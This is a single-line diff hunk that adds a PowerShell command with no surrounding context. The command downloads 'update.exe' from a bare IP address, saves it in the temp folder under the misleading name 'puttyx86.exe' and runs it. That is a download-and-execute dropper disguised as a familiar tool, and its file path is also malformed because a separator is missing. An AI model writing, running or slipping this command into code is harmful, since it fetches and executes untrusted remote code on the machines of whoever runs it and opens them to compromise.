@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://185.45.193.169/update.exe',"$env:TEMPputtyx86.exe");Start-Process ("$env:TEMPputtyx86.exe")
